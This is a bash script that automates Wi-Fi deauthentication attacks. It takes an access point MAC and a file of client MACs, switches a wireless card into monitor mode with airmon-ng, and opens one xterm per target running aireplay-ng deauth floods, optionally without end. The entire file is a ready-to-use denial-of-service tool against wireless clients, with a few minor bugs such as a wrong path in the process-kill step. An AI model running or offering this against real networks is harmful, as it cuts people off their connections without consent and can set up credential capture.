#!/bin/bash

# The Help file
while getopts "h" OPTION
do
	case $OPTION in
		h)
			echo $div
			echo " [*] Place the access point MAC address in the apMac.txt file. Only accepts one address"
			echo " [*] Place the list of Client MAC addresses in the targets.txt file. One address per line"
			echo " [*] NO EXTRA PUNCTUATION OR JUMK TEXT"
			echo " [*] Targets.txt can contain 'Client ' from kimset-ui logic will remove it"
			echo $div
			exit
			;;
	esac
done

# Check if file has been executed as root
if [ "$EUID" -ne 0 ]
  then echo "Run as root"
  echo
  sleep 5
  echo "exiting..."
  exit
fi

# Get current secounds since epoch, for unique temporary file names
ID=$(date +"%s")

# Create a temp directory
tempDir="temp"
mkdir $ID$tempDir

# Copy input files into temp folder
cp targets.txt $ID$tempDir/targets.txt
cp apMac.txt $ID$tempDir/apMac.txt

# x,y positons for spawning xterm windows
X=(+0 -0 -0 +0 +600 +300 -600 -600 -300 +200 +700)
Y=(+0 +0 -0 -0 -500 -300 +800 +500 +300 +200 -700)

# Divider
div='-------------------------------------------------------------------------------------------'

# Iteration variable for positon arrays
i=0

# Declare temporay file names
output="Output"
targets="targets"
apMac="apMac"
targetsLower="targetsLower"
apMacLower="apMacLower"

# Exit trap command

function finish() {
  	# Cleanup temporary files
	echo $div
	echo 'Cleaning up...'
	echo $div
	sudo rm -r $ID$tempDir

}
trap finish EXIT

# Move supplied targets into temp targets file
cat targets.txt > $ID$tempDir/$targets.txt

# Move the Access Point Mac into a temp folder
cat apMac.txt > $ID$tempDir/$apMac.txt

# Read interface and check if available
iw dev
printf "Interface name:  "
read int
echo $div
intState=`iw dev > $ID$tempDir/$output.txt` 
if grep -q $int $ID$tempDir/$output.txt; then
	echo -e "Target interface is available"
	echo $div
else 
	echo -e "Target is NOT available"
	exit
fi

# Ensure monitor is enabled, if not start monitor and check again, otherwise continue
sudo iw $int info > $ID$tempDir/$output.txt
if grep -q monitor $ID$tempDir/$output.txt; then
	successMessage="Target is in monitor mode"
	echo -e "${successMessage/Target/$int}"
	echo $div
else 
	echo "Target interface is not in Monitor mode"
	echo $div
	MonitorMessage="Putting interface into monitor"
	echo -e "${MonitorMessage/interface/$int}"
	echo $div
	sudo airmon-ng start $int > /dev/null
	sudo iw $int info > $ID$tempDir/$output.txt
	if grep -q monitor $ID$tempDir/$output.txt; then
		successMessage="Target is in monitor mode"
		echo "${successMessage/Target/$int}"
		echo $div
	fi
fi

# If interface was put into monitor by previous logic add 'mon' to int
if [[ $int != *'mon'* ]]; then
	int=$int'mon'
	
fi
# Read channel and set interface to that channel
printf "channel target is on:   "
read channel
echo $div
sudo iwconfig $int channel $channel

# Get number of Deauths 
printf "Enter the number of Deauths to send, 0 is infinite:    "
read deauths

# Check if 'Client ' is present, if so REMOVE THEM
#if grep -q 'Client '$targets.txt; then
#	sed -i 's/Client //g' $targets.txt
#fi
# Convert all macaddress to lowercase
tr '[:upper:]' '[:lower:]' < $ID$tempDir/$targets.txt > $ID$tempDir/$targetsLower.txt
tr '[:upper:]' '[:lower:]' < $ID$tempDir/$apMac.txt > $ID$tempDir/$apMacLower.txt
apMac=`cat $ID$tempDir/$apMacLower.txt`

# Create temp PID file in temp folder
touch $ID$tempDir/pids.txt

# Start  aireplay-ng -0 1 -a Access point mac -c client mac interface
# each client gets their own terminal window
#echo $int
cat $ID$tempDir/$targetsLower.txt | while read line; do
	xterm -geometry 90x20${X[i]}${Y[i]} -hold -e sudo aireplay-ng -0 $deauths -a $apMac -c $line $int &
	i=$((i+1))
	echo $! >> $ID$tempDir/pids.txt
done
echo "ctl + c to kill all processes"
read kill
cat pids.txt | while read line; do
	kill -9 $line
done
